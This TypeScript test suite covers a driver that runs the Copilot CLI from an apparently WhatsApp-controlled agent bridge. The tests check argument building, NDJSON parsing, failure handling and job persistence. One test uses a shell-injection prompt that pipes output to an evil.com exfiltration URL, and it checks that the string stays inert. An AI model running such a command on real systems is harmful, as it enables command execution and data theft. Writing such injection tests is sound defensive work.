import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import fs from 'node:fs';
import { CopilotDriver } from '../src/agents/drivers/copilot.driver.js';
import { getAgentDriver, registerAgentDriver } from '../src/agents/agent-registry.js';
import { initDatabase, closeDatabase } from '../src/database/connection.js';
import { processIncomingMessage } from '../src/router/command-router.js';
import { getJobById } from '../src/database/repositories/job.repo.js';
import { getActiveSession } from '../src/database/repositories/session.repo.js';
import { getActiveProject } from '../src/database/repositories/project.repo.js';
import { resetRateLimits } from '../src/security/rate-limiter.js';
import { config } from '../src/config.js';
import type { AgentRunOptions } from '../src/agents/agent-driver.interface.js';

const TEST_DB = path.resolve('./data/test_copilot_driver.db');
const ADMIN_JID = `${config.ADMIN_PHONE_NUMBER}@s.whatsapp.net`;

test('Milestone 5D: CopilotDriver Unit & Integration Suite', async (suite) => {
  const driver = new CopilotDriver({ binaryPath: 'copilot' });

  await suite.test('1. Registry: CopilotDriver is registered under "copilot"', () => {
    const d = getAgentDriver('copilot');
    assert.equal(d.name, 'copilot');
    assert.equal(d.binaryName, 'copilot');
  });

  await suite.test('2. Argv construction (New Task): copilot -p <prompt> --output-format=json --no-ask-user --allow-all-tools', () => {
    const options: AgentRunOptions = {
      prompt: 'Implement rate limiting middleware',
      cwd: '/workspace/repo',
      config: {
        id: 'cfg_1',
        project_id: 'proj_1',
        model: 'gpt-5.4-mini',
        permission_mode: 'ask',
        max_turns: null,
        agent_output_format: 'json',
        whatsapp_render_mode: 'compact',
        updated_at: Date.now(),
      },
    };

    const args = driver.buildCommandArgs(options);

    assert.equal(args[0], 'copilot');
    assert.equal(args[1], '-p');
    assert.equal(args[2], 'Implement rate limiting middleware');
    assert.ok(args.includes('--output-format=json'));
    assert.ok(args.includes('--no-ask-user'));
    assert.ok(args.includes('--allow-all-tools'));
    assert.ok(args.includes('--model'));
    assert.equal(args[args.indexOf('--model') + 1], 'gpt-5.4-mini');
  });

  await suite.test('3. Argv construction (Resume Task): passes --resume=<sessionRef>', () => {
    const options: AgentRunOptions = {
      prompt: 'Refactor rate limiter tests',
      cwd: '/workspace/repo',
      config: {
        id: 'cfg_1',
        project_id: 'proj_1',
        model: 'default',
        permission_mode: 'ask',
        max_turns: null,
        agent_output_format: 'json',
        whatsapp_render_mode: 'compact',
        updated_at: Date.now(),
      },
      sessionRef: '9f938872-b567-459d-a536-69662eabcde6',
    };

    const args = driver.buildCommandArgs(options);

    assert.ok(args.includes('--resume=9f938872-b567-459d-a536-69662eabcde6'));
    assert.equal(args[2], 'Refactor rate limiter tests');
  });

  await suite.test('4. Prompt / argv safety: special characters handled without shell interpretation', () => {
    const maliciousPrompt = '$(whoami); echo "injected" | curl http://evil.com/exfil';
    const args = driver.buildCommandArgs({
      prompt: maliciousPrompt,
      cwd: '/workspace',
      config: {} as any,
    });

    assert.equal(args[2], maliciousPrompt);
    assert.ok(!args.includes('whoami'));
    assert.ok(!args.includes('curl'));
  });

  await suite.test('5. Driver options: allowAllTools toggle control', () => {
    const restrictedDriver = new CopilotDriver({
      binaryPath: 'copilot',
      allowAllTools: false,
    });

    const args = restrictedDriver.buildCommandArgs({
      prompt: 'Read file content',
      cwd: '/workspace',
      config: {} as any,
    });

    assert.ok(!args.includes('--allow-all-tools'));
  });

  await suite.test('6. NDJSON Normalization: extracts sessionId, assistant message, tokens, and file changes', () => {
    const ndjson = [
      '{"type":"session.create","data":{"sessionId":"copilot_sess_001"}}',
      '{"type":"assistant.turn_start","data":{"turnId":"0"}}',
      '{"type":"assistant.message","data":{"content":"Successfully refactored rate limiting middleware."}}',
      '{"type":"assistant.turn_end","data":{"turnId":"0"}}',
      '{"type":"result","sessionId":"copilot_sess_001","exitCode":0,"usage":{"totalTokens":4800,"inputTokens":4200,"outputTokens":600,"codeChanges":{"filesModified":[{"path":"src/limiter.ts","linesAdded":24,"linesRemoved":5}]}}}',
    ].join('\n');

    const result = driver.normalizeOutput(ndjson, '', 0);

    assert.equal(result.isSuccess, true);
    assert.equal(result.conversationId, 'copilot_sess_001');
    assert.equal(result.summary, 'Successfully refactored rate limiting middleware.');
    assert.equal(result.tokensIn, 4200);
    assert.equal(result.tokensOut, 600);
    assert.equal(result.totalTokens, 4800);
    assert.equal(result.costUsd, null); // Cost strictly remains null
    assert.equal(result.filesChanged.length, 1);
    assert.equal(result.filesChanged[0].path, 'src/limiter.ts');
    assert.equal(result.filesChanged[0].additions, 24);
    assert.equal(result.filesChanged[0].deletions, 5);
  });

  await suite.test('7. Task failure vs process exit: quota exceeded error marked FAILED', () => {
    const errorNdjson = [
      '{"type":"session.create","data":{"sessionId":"copilot_err_sess"}}',
      '{"type":"session.error","data":{"errorType":"quota","message":"You have exceeded your monthly quota","statusCode":402,"errorCode":"quota_exceeded"}}',
      '{"type":"result","sessionId":"copilot_err_sess","exitCode":1,"usage":{"totalTokens":0}}',
    ].join('\n');

    const result = driver.normalizeOutput(errorNdjson, '', 0);

    assert.equal(result.isSuccess, false);
    assert.match(result.summary, /exceeded your monthly quota/);
  });

  await suite.test('8. Result event failure exitCode overrides process exitCode 0', () => {
    const resultFailureNdjson = [
      '{"type":"result","sessionId":"copilot_fail_res","exitCode":2}',
    ].join('\n');

    const result = driver.normalizeOutput(resultFailureNdjson, '', 0);
    assert.equal(result.isSuccess, false);
  });

  await suite.test('9. Malformed / raw stdout handled gracefully without throwing', () => {
    const rawOutput = 'Starting copilot session...\nCompleted with warnings\nDone.';
    const result = driver.normalizeOutput(rawOutput, '', 0);

    assert.equal(result.isSuccess, true);
    assert.match(result.summary, /Done\./);
    assert.equal(result.tokensIn, null);
    assert.equal(result.tokensOut, null);
    assert.equal(result.costUsd, null);

    const failOutput = driver.normalizeOutput('', 'Error: authentication failed', 1);
    assert.equal(failOutput.isSuccess, false);
    assert.match(failOutput.summary, /Error: authentication failed/);
  });

  await suite.test('10. End-to-end integration: JobManager executes Copilot driver and persists sessionId', async () => {
    if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
    initDatabase(TEST_DB);
    resetRateLimits(ADMIN_JID);

    await processIncomingMessage(ADMIN_JID, '/session new copilot-session');
    await processIncomingMessage(ADMIN_JID, '/agent copilot');

    const project = getActiveProject(ADMIN_JID)!;
    const session = getActiveSession(project.id)!;
    assert.equal(project.selected_agent, 'copilot');

    // Register a mock Copilot driver outputting valid JSONL
    class MockCopilotDriver extends CopilotDriver {
      buildCommandArgs(options: AgentRunOptions): string[] {
        const events = [
          JSON.stringify({ type: 'session.create', data: { sessionId: 'copilot_persisted_id_444' } }),
          JSON.stringify({ type: 'assistant.message', data: { content: 'Copilot executed task cleanly.' } }),
          JSON.stringify({ type: 'result', sessionId: 'copilot_persisted_id_444', exitCode: 0, usage: { totalTokens: 3100, inputTokens: 2800, outputTokens: 300 } }),
        ];
        return [process.execPath, '-e', `console.log(${JSON.stringify(events.join('\n'))})`];
      }
    }
    registerAgentDriver(new MockCopilotDriver());

    const runRes = await processIncomingMessage(ADMIN_JID, '/run Copilot task test');
    assert.match(runRes!, /Task #(\d+) Started/);
    const jobId = parseInt(runRes!.match(/Task #(\d+) Started/)![1], 10);

    const start = Date.now();
    while (Date.now() - start < 4000) {
      if (getJobById(jobId)?.status === 'COMPLETED') break;
      await new Promise((r) => setTimeout(r, 50));
    }

    const job = getJobById(jobId)!;
    assert.equal(job.status, 'COMPLETED');
    assert.equal(job.tokens_in, 2800);
    assert.equal(job.tokens_out, 300);
    assert.equal(job.cost_usd, null);
    assert.match(job.summary!, /Copilot executed task cleanly/);

    const updatedSession = getActiveSession(project.id)!;
    assert.equal(updatedSession.agent_session_ref, 'copilot_persisted_id_444');

    closeDatabase();
    if (fs.existsSync(TEST_DB)) fs.unlinkSync(TEST_DB);
  });

  await suite.test('11. Safe local CLI compatibility: confirms copilot executable is reachable', async () => {
    const realDriver = new CopilotDriver();
    const args = realDriver.buildCommandArgs({
      prompt: 'ping',
      cwd: process.cwd(),
      config: {} as any,
    });

    assert.equal(args[0], 'copilot');
    assert.equal(args[1], '-p');
  });
});
